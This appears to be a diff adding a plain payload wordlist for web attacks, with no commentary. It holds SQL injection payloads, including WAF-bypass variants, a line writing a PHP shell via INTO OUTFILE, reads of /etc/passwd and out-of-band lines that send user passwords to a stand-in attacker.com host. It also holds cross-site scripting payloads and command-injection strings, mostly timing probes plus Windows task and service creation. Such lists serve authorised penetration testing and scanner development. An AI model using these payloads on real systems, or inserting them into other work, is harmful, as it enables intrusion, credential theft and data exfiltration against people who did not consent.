@@ -1,0 +1,794 @@
+================================================================================
+SQL INJECTION PAYLOADS - BASIC
+================================================================================
+
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1/*
+' OR 1=1 LIMIT 1 --
+'=' 'or'
+' OR ''='
+' OR 'x'='x
+' OR 'x'='x' --
+admin' --
+admin' #
+admin'/*
+' OR 1 LIMIT 1 --
+' OR 1=1--
+' OR 1=1#
+') OR ('1'='1
+') OR ('1'='1') --
+')) OR (('1'='1
+')) OR (('1'='1')) --
+
+================================================================================
+SQL INJECTION PAYLOADS - UNION BASED
+================================================================================
+
+' UNION SELECT null --
+' UNION SELECT null,null --
+' UNION SELECT null,null,null --
+' UNION SELECT username,password FROM users --
+' UNION SELECT 1,2,3 --
+' UNION ALL SELECT null --
+' UNION SELECT @@version --
+' UNION SELECT user(),database() --
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT load_file('/etc/passwd') --
+' UNION SELECT null INTO OUTFILE '/var/www/html/shell.php' --
+
+================================================================================
+SQL INJECTION PAYLOADS - BOOLEAN BASED BLIND
+================================================================================
+
+' AND 1=1 --
+' AND 1=2 --
+' AND substring((SELECT password FROM users WHERE username='admin'),1,1)='a' --
+' AND (SELECT COUNT(*) FROM users)>5 --
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>100 --
+' AND LENGTH((SELECT database()))>5 --
+
+================================================================================
+SQL INJECTION PAYLOADS - TIME BASED BLIND
+================================================================================
+
+' AND SLEEP(5) --
+' AND SLEEP(5) #
+' AND SLEEP(5)/*
+' AND WAITFOR DELAY '0:0:5' --
+' AND pg_sleep(5) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+' AND benchmark(10000000,MD5(1)) --
+
+================================================================================
+SQL INJECTION PAYLOADS - ERROR BASED
+================================================================================
+
+' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) --
+' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) --
+
+================================================================================
+SQL INJECTION PAYLOADS - PRO LEVEL WAF BYPASS
+================================================================================
+
+'/**/UnIoN/**/SeLeCt/**/NuLl,NuLl--
+'/*!50000UnIoN*//*!50000SeLeCt*/NuLl,NuLl--
+' UnI/**/On SeLeCt 1,2,3--
+'/*!50000%55nIoN*/+/*!50000%53eLeCt*/+1,2,3--
+'/**/UN/**/ION/**/SEL/**/ECT/**/NU/**/LL--
+'/*!00000UNION*//*!00000SELECT*/null,null--
+%00' UNION SELECT 1,2,3--
+%00'/**/OR/**/1=1--
+%0b' UNION SELECT 1,2,3--
+%0c' UNION SELECT 1,2,3--
+%0d' UNION SELECT 1,2,3--
+%0e' UNION SELECT 1,2,3--
+%0f' UNION SELECT 1,2,3--
+%20' UNION SELECT 1,2,3--
+%09' UNION SELECT 1,2,3--
+%0a' UNION SELECT 1,2,3--
+
+================================================================================
+SQL INJECTION PAYLOADS - OUT OF BAND (OOB)
+================================================================================
+
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.attacker.com\\a.txt')) --
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 0,1),'.attacker.com\\foo'))) --
+'; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com' --
+'; EXEC master..xp_dirtree '\\attacker.com\share' --
+' AND UTL_HTTP.request('http://attacker.com/?data='||(SELECT password FROM users WHERE ROWNUM=1)) IS NOT NULL --
+
+================================================================================
+XSS PAYLOADS - BASIC SCRIPT TAGS
+================================================================================
+
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(1)</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+<script>console.log(document.cookie)</script>
+
+================================================================================
+XSS PAYLOADS - EVENT HANDLERS
+================================================================================
+
+' onerror=alert(1) src=x
+' onload=alert(1) src=x
+' onmouseover=alert(1) src=x
+' autofocus onfocus=alert(1) src=x
+' onmouseenter=alert(1) src=x
+' onmouseleave=alert(1) src=x
+' onclick=alert(1) src=x
+' ondblclick=alert(1) src=x
+' onkeypress=alert(1) src=x
+' onkeydown=alert(1) src=x
+' onkeyup=alert(1) src=x
+' onchange=alert(1) src=x
+' onsubmit=alert(1) src=x
+' onreset=alert(1) src=x
+' onselect=alert(1) src=x
+' onblur=alert(1) src=x
+' onfocus=alert(1) src=x
+' oninput=alert(1) src=x
+' oninvalid=alert(1) src=x
+' onsearch=alert(1) src=x
+' ondrag=alert(1) src=x
+' ondrop=alert(1) src=x
+' ondragstart=alert(1) src=x
+' ondragend=alert(1) src=x
+' ondragenter=alert(1) src=x
+' ondragleave=alert(1) src=x
+' ondragover=alert(1) src=x
+' onscroll=alert(1) src=x
+' onresize=alert(1) src=x
+' onpageshow=alert(1) src=x
+' onpagehide=alert(1) src=x
+' onunload=alert(1) src=x
+' onhashchange=alert(1) src=x
+' onpopstate=alert(1) src=x
+' ononline=alert(1) src=x
+' onoffline=alert(1) src=x
+' onmessage=alert(1) src=x
+' onstorage=alert(1) src=x
+' ontoggle=alert(1) src=x
+' onwaiting=alert(1) src=x
+' onplaying=alert(1) src=x
+' onpause=alert(1) src=x
+' onended=alert(1) src=x
+' onloadeddata=alert(1) src=x
+' onloadedmetadata=alert(1) src=x
+' onloadstart=alert(1) src=x
+' onprogress=alert(1) src=x
+' onsuspend=alert(1) src=x
+' onstalled=alert(1) src=x
+' onabort=alert(1) src=x
+' onemptied=alert(1) src=x
+' onratechange=alert(1) src=x
+' ondurationchange=alert(1) src=x
+' onvolumechange=alert(1) src=x
+' ontimeupdate=alert(1) src=x
+' onseeking=alert(1) src=x
+' onseeked=alert(1) src=x
+' oncanplay=alert(1) src=x
+' oncanplaythrough=alert(1) src=x
+' oncuechange=alert(1) src=x
+' onenter=alert(1) src=x
+' onexit=alert(1) src=x
+' oncopy=alert(1) src=x
+' oncut=alert(1) src=x
+' onpaste=alert(1) src=x
+' onbeforecopy=alert(1) src=x
+' onbeforecut=alert(1) src=x
+' onbeforepaste=alert(1) src=x
+' oncontextmenu=alert(1) src=x
+' onshow=alert(1) src=x
+' onwheel=alert(1) src=x
+' onanimationstart=alert(1) src=x
+' onanimationend=alert(1) src=x
+' onanimationiteration=alert(1) src=x
+' ontransitionstart=alert(1) src=x
+' ontransitionend=alert(1) src=x
+' ontransitionrun=alert(1) src=x
+' ontransitioncancel=alert(1) src=x
+' onpointerdown=alert(1) src=x
+' onpointerup=alert(1) src=x
+' onpointercancel=alert(1) src=x
+' onpointermove=alert(1) src=x
+' onpointerover=alert(1) src=x
+' onpointerout=alert(1) src=x
+' onpointerenter=alert(1) src=x
+' onpointerleave=alert(1) src=x
+' ongotpointercapture=alert(1) src=x
+' onlostpointercapture=alert(1) src=x
+' onselectstart=alert(1) src=x
+' onselectionchange=alert(1) src=x
+' onfullscreenchange=alert(1) src=x
+' onfullscreenerror=alert(1) src=x
+' onwebkitfullscreenchange=alert(1) src=x
+' onwebkitfullscreenerror=alert(1) src=x
+' onformdata=alert(1) src=x
+' onbeforeinput=alert(1) src=x
+' onsecuritypolicyviolation=alert(1) src=x
+' onslotchange=alert(1) src=x
+
+================================================================================
+XSS PAYLOADS - SEARCH BOX CONTEXT
+================================================================================
+
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+'><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+'><svg onload=alert('XSS')>
+"><body onload=alert('XSS')>
+'><body onload=alert('XSS')>
+"><iframe src=javascript:alert('XSS')>
+'><iframe src=javascript:alert('XSS')>
+" onfocus=alert('XSS') autofocus "
+" onmouseover=alert('XSS') "
+" onmouseenter=alert('XSS') "
+" onclick=alert('XSS') "
+" ondblclick=alert('XSS') "
+" oninput=alert('XSS') "
+" onchange=alert('XSS') "
+" onkeydown=alert('XSS') "
+" onkeypress=alert('XSS') "
+" onkeyup=alert('XSS') "
+" onblur=alert('XSS') "
+" onselect=alert('XSS') "
+" oninvalid=alert('XSS') "
+" onsearch=alert('XSS') "
+" ondrag=alert('XSS') "
+" ondrop=alert('XSS') "
+" ondragstart=alert('XSS') "
+" ondragend=alert('XSS') "
+" ondragenter=alert('XSS') "
+" ondragleave=alert('XSS') "
+" ondragover=alert('XSS') "
+" oncontextmenu=alert('XSS') "
+" onshow=alert('XSS') "
+" onwheel=alert('XSS') "
+" onanimationstart=alert('XSS') "
+" onanimationend=alert('XSS') "
+" onanimationiteration=alert('XSS') "
+" ontransitionstart=alert('XSS') "
+" ontransitionend=alert('XSS') "
+" ontransitionrun=alert('XSS') "
+" ontransitioncancel=alert('XSS') "
+" onpointerdown=alert('XSS') "
+" onpointerup=alert('XSS') "
+" onpointercancel=alert('XSS') "
+" onpointermove=alert('XSS') "
+" onpointerover=alert('XSS') "
+" onpointerout=alert('XSS') "
+" onpointerenter=alert('XSS') "
+" onpointerleave=alert('XSS') "
+" ongotpointercapture=alert('XSS') "
+" onlostpointercapture=alert('XSS') "
+" onselectstart=alert('XSS') "
+" onselectionchange=alert('XSS') "
+" onfullscreenchange=alert('XSS') "
+" onfullscreenerror=alert('XSS') "
+" onwebkitfullscreenchange=alert('XSS') "
+" onwebkitfullscreenerror=alert('XSS') "
+" onformdata=alert('XSS') "
+" onbeforeinput=alert('XSS') "
+" onsecuritypolicyviolation=alert('XSS') "
+" onslotchange=alert('XSS') "
+
+================================================================================
+COMMAND INJECTION - UNIX TIME BASED
+================================================================================
+
+;sleep 5
+|sleep 5
+||sleep 5
+&&sleep 5
+`sleep 5`
+$(sleep 5)
+;sleep${IFS}5
+|sleep${IFS}5
+&&sleep${IFS}5
+||sleep${IFS}5
+`sleep${IFS}5`
+$(sleep${IFS}5)
+;sleep$IFS$5
+|sleep$IFS$5
+&&sleep$IFS$5
+||sleep$IFS$5
+;sleep$IFS$IFS$5
+|sleep$IFS$IFS$5
+&&sleep$IFS$IFS$5
+||sleep$IFS$IFS$5
+;sleep${IFS}5${IFS};
+|sleep${IFS}5${IFS}|
+&&sleep${IFS}5${IFS}&&
+||sleep${IFS}5${IFS}||
+;sleep${IFS}5#
+|sleep${IFS}5#
+&&sleep${IFS}5#
+||sleep${IFS}5#
+`sleep${IFS}5`
+$(sleep${IFS}5)
+$(sleep${IFS}5)
+${IFS}sleep${IFS}5
+;${IFS}sleep${IFS}5
+|${IFS}sleep${IFS}5
+&&${IFS}sleep${IFS}5
+||${IFS}sleep${IFS}5
+;${IFS}sleep${IFS}5${IFS};
+|${IFS}sleep${IFS}5${IFS}|
+&&${IFS}sleep${IFS}5${IFS}&&
+||${IFS}sleep${IFS}5${IFS}||
+%0asleep%205
+%0asleep${IFS}5
+%0asleep 5
+%0d%0asleep 5
+%3bsleep%205
+%7csleep%205
+%26%26sleep%205
+%7c%7csleep%205
+%60sleep%205%60
+%24%28sleep%205%29
+%3bsleep%24%7bIFS%7d5
+%7csleep%24%7bIFS%7d5
+%26%26sleep%24%7bIFS%7d5
+%7c%7csleep%24%7bIFS%7d5
+%3bping%20-c%205%20127.0.0.1
+%7cping%20-c%205%20127.0.0.1
+%26%26ping%20-c%205%20127.0.0.1
+%7c%7cping%20-c%205%20127.0.0.1
+
+================================================================================
+COMMAND INJECTION - WINDOWS TIME BASED
+================================================================================
+
+|timeout /t 5 /nobreak
+&timeout /t 5 /nobreak
+&&timeout /t 5 /nobreak
+||timeout /t 5 /nobreak
+%7ctimeout%20/t%205%20/nobreak
+%26timeout%20/t%205%20/nobreak
+%26%26timeout%20/t%205%20/nobreak
+%7c%7ctimeout%20/t%205%20/nobreak
+|ping -n 6 127.0.0.1
+&ping -n 6 127.0.0.1
+&&ping -n 6 127.0.0.1
+||ping -n 6 127.0.0.1
+|ping -n 6 localhost
+&ping -n 6 localhost
+&&ping -n 6 localhost
+||ping -n 6 localhost
+|ping 127.0.0.1 -n 6
+&ping 127.0.0.1 -n 6
+&&ping 127.0.0.1 -n 6
+||ping 127.0.0.1 -n 6
+%7cping%20-n%206%20127.0.0.1
+%26ping%20-n%206%20127.0.0.1
+%26%26ping%20-n%206%20127.0.0.1
+%7c%7cping%20-n%206%20127.0.0.1
+|powershell -c "Start-Sleep -s 5"
+&powershell -c "Start-Sleep -s 5"
+&&powershell -c "Start-Sleep -s 5"
+||powershell -c "Start-Sleep -s 5"
+|powershell -command "Start-Sleep -milliseconds 5000"
+&powershell -command "Start-Sleep -milliseconds 5000"
+|cmd /c "timeout /t 5 /nobreak"
+&cmd /c "timeout /t 5 /nobreak"
+&&cmd /c "timeout /t 5 /nobreak"
+||cmd /c "timeout /t 5 /nobreak"
+|wscript -e:jscript -e:javascript "WScript.Sleep(5000)"
+&wscript -e:jscript -e:javascript "WScript.Sleep(5000)"
+|cscript //E:jscript -e:javascript "WScript.Sleep(5000)"
+&cscript //E:jscript -e:javascript "WScript.Sleep(5000)"
+|for /l %i in (1,1,500000) do @echo %i>nul
+&for /l %i in (1,1,500000) do @echo %i>nul
+&&for /l %i in (1,1,500000) do @echo %i>nul
+||for /l %i in (1,1,500000) do @echo %i>nul
+|for /L %i in (1,1,500000) do @set /a 1+1 >nul
+&for /L %i in (1,1,500000) do @set /a 1+1 >nul
+&&for /L %i in (1,1,500000) do @set /a 1+1 >nul
+||for /L %i in (1,1,500000) do @set /a 1+1 >nul
+|dir /s /b C:\ >nul
+&dir /s /b C:\ >nul
+&&dir /s /b C:\ >nul
+||dir /s /b C:\ >nul
+|tree C:\ /f >nul
+&tree C:\ /f >nul
+&&tree C:\ /f >nul
+||tree C:\ /f >nul
+|type C:\Windows\System32\drivers\etc\hosts >nul
+&type C:\Windows\System32\drivers\etc\hosts >nul
+&&type C:\Windows\System32\drivers\etc\hosts >nul
+||type C:\Windows\System32\drivers\etc\hosts >nul
+|findstr /s /i "*" C:\*.* >nul
+&findstr /s /i "*" C:\*.* >nul
+&&findstr /s /i "*" C:\*.* >nul
+||findstr /s /i "*" C:\*.* >nul
+
+================================================================================
+COMMAND INJECTION - ALTERNATIVE UNIX DELAYS
+================================================================================
+
+;ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+&&ping -c 5 127.0.0.1
+||ping -c 5 127.0.0.1
+;ping -c 5 localhost
+|ping -c 5 localhost
+&&ping -c 5 localhost
+||ping -c 5 localhost
+;ping 127.0.0.1 -c 5
+|ping 127.0.0.1 -c 5
+&&ping 127.0.0.1 -c 5
+||ping 127.0.0.1 -c 5
+;waitfor 5
+|waitfor 5
+&&waitfor 5
+||waitfor 5
+;read -t 5
+|read -t 5
+&&read -t 5
+||read -t 5
+;tail -f /dev/null --pid=$$ -n 0 --sleep-interval=5 &
+|tail -f /dev/null --pid=$$ -n 0 --sleep-interval=5 &
+&&tail -f /dev/null --pid=$$ -n 0 --sleep-interval=5 &
+||tail -f /dev/null --pid=$$ -n 0 --sleep-interval=5 &
+;awk 'BEGIN{system("sleep 5")}'
+|awk 'BEGIN{system("sleep 5")}'
+&&awk 'BEGIN{system("sleep 5")}'
+||awk 'BEGIN{system("sleep 5")}'
+;perl -e 'sleep(5)'
+|perl -e 'sleep(5)'
+&&perl -e 'sleep(5)'
+||perl -e 'sleep(5)'
+;python -c 'import time; time.sleep(5)'
+|python -c 'import time; time.sleep(5)'
+&&python -c 'import time; time.sleep(5)'
+||python -c 'import time; time.sleep(5)'
+;python3 -c 'import time; time.sleep(5)'
+|python3 -c 'import time; time.sleep(5)'
+&&python3 -c 'import time; time.sleep(5)'
+||python3 -c 'import time; time.sleep(5)'
+;ruby -e 'sleep(5)'
+|ruby -e 'sleep(5)'
+&&ruby -e 'sleep(5)'
+||ruby -e 'sleep(5)'
+;php -r 'sleep(5);'
+|php -r 'sleep(5);'
+&&php -r 'sleep(5);'
+||php -r 'sleep(5);'
+;node -e 'setTimeout(function(){}, 5000)'
+|node -e 'setTimeout(function(){}, 5000)'
+&&node -e 'setTimeout(function(){}, 5000)'
+||node -e 'setTimeout(function(){}, 5000)'
+
+================================================================================
+COMMAND INJECTION - HEAVY COMPUTATION (UNIVERSAL)
+================================================================================
+
+;for i in {1..500000}; do echo $i > /dev/null; done
+|for i in {1..500000}; do echo $i > /dev/null; done
+&&for i in {1..500000}; do echo $i > /dev/null; done
+||for i in {1..500000}; do echo $i > /dev/null; done
+;for i in $(seq 1 500000); do echo $i > /dev/null; done
+|for i in $(seq 1 500000); do echo $i > /dev/null; done
+&&for i in $(seq 1 500000); do echo $i > /dev/null; done
+||for i in $(seq 1 500000); do echo $i > /dev/null; done
+;while :; do :; done &
+|while :; do :; done &
+&&while :; do :; done &
+||while :; do :; done &
+;yes > /dev/null &
+|yes > /dev/null &
+&&yes > /dev/null &
+||yes > /dev/null &
+;dd if=/dev/zero of=/dev/null bs=1M count=500
+|dd if=/dev/zero of=/dev/null bs=1M count=500
+&&dd if=/dev/zero of=/dev/null bs=1M count=500
+||dd if=/dev/zero of=/dev/null bs=1M count=500
+;cat /dev/urandom | head -c 100000000 > /dev/null
+|cat /dev/urandom | head -c 100000000 > /dev/null
+&&cat /dev/urandom | head -c 100000000 > /dev/null
+||cat /dev/urandom | head -c 100000000 > /dev/null
+;find / -name "*" 2>/dev/null | head -100000
+|find / -name "*" 2>/dev/null | head -100000
+&&find / -name "*" 2>/dev/null | head -100000
+||find / -name "*" 2>/dev/null | head -100000
+;grep -r "." / 2>/dev/null | head -100000
+|grep -r "." / 2>/dev/null | head -100000
+&&grep -r "." / 2>/dev/null | head -100000
+||grep -r "." / 2>/dev/null | head -100000
+
+================================================================================
+COMMAND INJECTION - OBFUSCATION & BYPASS
+================================================================================
+
+;$(printf '%s' 'sleep')$IFS$(printf '%s' '5')
+|$(printf '%s' 'sleep')$IFS$(printf '%s' '5')
+&&$(printf '%s' 'sleep')$IFS$(printf '%s' '5')
+||$(printf '%s' 'sleep')$IFS$(printf '%s' '5')
+;`printf '%s' 'sleep'``printf '%s' '5'`
+|`printf '%s' 'sleep'``printf '%s' '5'`
+&&`printf '%s' 'sleep'``printf '%s' '5'`
+||`printf '%s' 'sleep'``printf '%s' '5'`
+;{sleep,5}
+|{sleep,5}
+&&{sleep,5}
+||{sleep,5}
+`{sleep,5}`
+$({sleep,5})
+;{sleep${IFS},5}
+|{sleep${IFS},5}
+&&{sleep${IFS},5}
+||{sleep${IFS},5}
+%00;sleep 5
+%00|sleep 5
+%00&&sleep 5
+%00||sleep 5
+%00`sleep 5`
+%00$(sleep 5)
+%0asleep 5
+%0d%0asleep 5
+%0asleep${IFS}5
+%0d%0asleep${IFS}5
+%0a`sleep 5`
+%0d%0a`sleep 5`
+%0a$(sleep 5)
+%0d%0a$(sleep 5)
+;sleep	5
+|sleep	5
+&&sleep	5
+||sleep	5
+`sleep	5`
+$(sleep	5)
+;sleep
+5
+|sleep
+5
+&&sleep
+5
+||sleep
+5
+`sleep
+5`
+$(sleep
+5)
+
+================================================================================
+COMMAND INJECTION - ADVANCED SUBSTITUTION
+================================================================================
+
+$((sleep 5))
+$[sleep 5]
+$((`sleep 5`))
+$[$(sleep 5)]
+<(sleep 5)
+>(sleep 5)
+<<EOF
+sleep 5
+EOF
+<<<"sleep 5"
+|xargs sleep 5
+|xargs -I {} sleep 5
+|parallel sleep 5
+|parallel -j1 sleep 5
+awk 'BEGIN{system("sleep 5")}'
+awk 'BEGIN{system("sleep${IFS}5")}'
+awk 'BEGIN{system("sleep\t5")}'
+awk 'BEGIN{system("sleep\n5")}'
+sed -e '1!d' -e 's/.*/sleep 5/e'
+sed 's/.*/sleep 5/e'
+find . -exec sleep 5 \;
+find . -exec sleep 5 {} +
+find . -exec sleep${IFS}5 \;
+find . -exec sleep${IFS}5 {} +
+printf '%s\n' "$(sleep 5)"
+printf '%s' "`sleep 5`"
+cut -d '' -f1 < <(sleep 5)
+read -t 5
+read -t 5 -p ""
+read -t 5 -p "" var
+wait $((5))
+sleep 5 & wait
+eval "sleep 5"
+eval 'sleep 5'
+eval `sleep 5`
+eval $(sleep 5)
+exec sleep 5
+. <(sleep 5)
+source <(sleep 5)
+logger "`sleep 5`"
+wall "`sleep 5`"
+mail -s "$(sleep 5)" root
+mail -s "`sleep 5`" root
+at now + 5 minutes -f /dev/null 2>/dev/null
+echo "sleep 5" | at now
+nice -n 19 sleep 5
+renice 19 $$; sleep 5
+: $(sleep 5)
+: `sleep 5`
+true $(sleep 5)
+false $(sleep 5)
+test "$(sleep 5)"
+[ "$(sleep 5)" ]
+[[ "$(sleep 5)" ]]
+case $(sleep 5) in esac
+case `sleep 5` in esac
+if $(sleep 5); then :; fi
+if `sleep 5`; then :; fi
+if [ "$(sleep 5)" ]; then :; fi
+while $(sleep 5); do :; done
+while `sleep 5`; do :; done
+while [ "$(sleep 5)" ]; do :; done
+until $(sleep 5); do :; done
+until `sleep 5`; do :; done
+until [ "$(sleep 5)" ]; do :; done
+for i in $(sleep 5); do :; done
+for i in `sleep 5`; do :; done
+f() { sleep 5; }; f
+$(f() { sleep 5; }; f)
+`f() { sleep 5; }; f`
+alias s='sleep 5'; s
+$(alias s='sleep 5'; s)
+export $(sleep 5)
+export `sleep 5`
+unset $(sleep 5)
+unset `sleep 5`
+shift $(sleep 5)
+shift `sleep 5`
+exit $(sleep 5)
+exit `sleep 5`
+return $(sleep 5) 2>/dev/null
+return `sleep 5` 2>/dev/null
+for i in 1; do continue $(sleep 5); done 2>/dev/null
+for i in 1; do break $(sleep 5); done 2>/dev/null
+. ~/.bashrc 2>/dev/null; sleep 5
+source /etc/profile 2>/dev/null; sleep 5
+
+================================================================================
+COMMAND INJECTION - NETWORK DELAYS
+================================================================================
+
+ssh -o ConnectTimeout=5 127.0.0.1 2>/dev/null
+ssh -o ConnectionAttempts=1 -o ConnectTimeout=5 127.0.0.1 2>/dev/null
+scp -o ConnectTimeout=5 /dev/null 127.0.0.1:/dev/null 2>/dev/null
+sftp -o ConnectTimeout=5 127.0.0.1 2>/dev/null
+curl -m 5 http://127.0.0.1 2>/dev/null
+wget --timeout=5 http://127.0.0.1 2>/dev/null
+curl --connect-timeout 5 http://127.0.0.1 2>/dev/null
+wget --dns-timeout=5 --connect-timeout=5 http://127.0.0.1 2>/dev/null
+nc -w 5 127.0.0.1 1 2>/dev/null
+ncat -w 5 127.0.0.1 1 2>/dev/null
+netcat -w 5 127.0.0.1 1 2>/dev/null
+telnet 127.0.0.1 1 2>/dev/null & sleep 5; kill $! 2>/dev/null
+ftp -n 127.0.0.1 1 2>/dev/null & sleep 5; kill $! 2>/dev/null
+tftp 127.0.0.1 1 2>/dev/null & sleep 5; kill $! 2>/dev/null
+
+================================================================================
+COMMAND INJECTION - DATABASE DELAYS
+================================================================================
+
+mysql -e "SELECT SLEEP(5);" 2>/dev/null
+psql -c "SELECT pg_sleep(5);" 2>/dev/null
+sqlite3 :memory: ".timeout 5000" 2>/dev/null
+redis-cli --eval <(echo "redis.call('DEBUG', 'SLEEP', 5000)") 2>/dev/null
+
+================================================================================
+COMMAND INJECTION - PROGRAMMING LANGUAGE ONE-LINERS
+================================================================================
+
+perl -e 'sleep(5)'
+python -c 'import time; time.sleep(5)'
+python3 -c 'import time; time.sleep(5)'
+ruby -e 'sleep(5)'
+php -r 'sleep(5);'
+node -e 'setTimeout(function(){}, 5000)'
+lua -e 'os.execute("sleep 5")'
+tclsh -c 'after 5000; exit'
+expect -c 'sleep 5'
+gawk 'BEGIN{system("sleep 5")}'
+mawk 'BEGIN{system("sleep 5")}'
+awk 'BEGIN{system("sleep 5")}'
+sed 's/.*/sleep 5/e'
+
+================================================================================
+COMMAND INJECTION - WINDOWS POWERSHELL
+================================================================================
+
+powershell -c "Start-Sleep -s 5"
+powershell -command "Start-Sleep -s 5"
+powershell -c "Start-Sleep -milliseconds 5000"
+powershell -command "Start-Sleep -milliseconds 5000"
+powershell -c "for($i=0;$i -lt 500000;$i++){}"
+powershell -command "for($i=0;$i -lt 500000;$i++){}"
+powershell -c "1..500000 | ForEach-Object { $_ }"
+powershell -command "1..500000 | ForEach-Object { $_ }"
+powershell -c "[System.Threading.Thread]::Sleep(5000)"
+powershell -command "[System.Threading.Thread]::Sleep(5000)"
+powershell -c "Start-Sleep 5"
+powershell -command "Start-Sleep 5"
+
+================================================================================
+COMMAND INJECTION - WINDOWS CMD
+================================================================================
+
+cmd /c "timeout /t 5 /nobreak"
+cmd /c "ping -n 6 127.0.0.1 >nul"
+cmd /c "ping -n 6 localhost >nul"
+cmd /v /c "set /a x=0" & for /l %i in (1,1,500000) do @set /a x=%x%+1 >nul
+cmd /c "for /l %i in (1,1,500000) do @echo %i>nul"
+cmd /c "for /L %i in (1,1,500000) do @set /a 1+1 >nul"
+cmd /c "dir /s /b C:\ >nul"
+cmd /c "tree C:\ /f >nul"
+cmd /c "type C:\Windows\System32\drivers\etc\hosts >nul"
+cmd /c "findstr /s /i \"*\" C:\*.* >nul"
+cmd /c "certutil -encode C:\Windows\System32\drivers\etc\hosts C:\temp.tmp >nul"
+cmd /c "bitsadmin /transfer myDownloadJob /download /priority normal http://127.0.0.1 C:\temp.tmp >nul"
+
+================================================================================
+COMMAND INJECTION - WINDOWS VBSCRIPT/JSCRIPT
+================================================================================
+
+cscript //E:vbscript //Nologo -e:vbscript "WScript.Sleep 5000"
+cscript //E:jscript //Nologo -e:javascript "WScript.Sleep(5000)"
+wscript -e:vbscript -e:vbscript "WScript.Sleep 5000"
+wscript -e:jscript -e:javascript "WScript.Sleep(5000)"
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""ping -n 6 127.0.0.1"",0:close")
+mshta javascript:Execute("new ActiveXObject('WScript.Shell').Run('ping -n 6 127.0.0.1', 0);close()");
+
+================================================================================
+COMMAND INJECTION - WINDOWS WMI & SERVICES
+================================================================================
+
+wmic process call create "cmd /c timeout /t 5 /nobreak"
+wmic process call create "cmd /c ping -n 6 127.0.0.1"
+schtasks /create /tn mytask /tr "cmd /c timeout /t 5 /nobreak" /sc once /st 00:00 /f
+schtasks /run /tn mytask
+schtasks /delete /tn mytask /f
+at 00:00 /interactive "cmd /c timeout /t 5 /nobreak"
+at 00:00 /interactive "cmd /c ping -n 6 127.0.0.1"
+sc create myservice binPath= "cmd /c timeout /t 5 /nobreak" start= demand
+sc start myservice
+sc delete myservice
+
+================================================================================
+COMMAND INJECTION - DOUBLE URL ENCODED
+================================================================================
+
+%253bsleep%25205
+%257csleep%25205
+%2526%2526sleep%25205
+%257c%257csleep%25205
+%2560sleep%25205%2560
+%2524%2528sleep%25205%2529
+%253b%2524%2528sleep%25205%2529
+%257c%2524%2528sleep%25205%2529
+%2526%2526%2524%2528sleep%25205%2529
+%257c%257c%2524%2528sleep%25205%2529
+
+================================================================================
+COMMAND INJECTION - HTML ENTITY ENCODED
+================================================================================
+
+&#59;sleep 5
+&#124;sleep 5
+&#38;&#38;sleep 5
+&#124;&#124;sleep 5
+&#96;sleep 5&#96;
+&#36;&#40;sleep 5&#41;
+&#59;&#36;&#40;sleep 5&#41;
+&#124;&#36;&#40;sleep 5&#41;
+&#38;&#38;&#36;&#40;sleep 5&#41;
+&#124;&#124;&#36;&#40;sleep 5&#41;
+
+================================================================================
+END OF PAYLOADS
+================================================================================
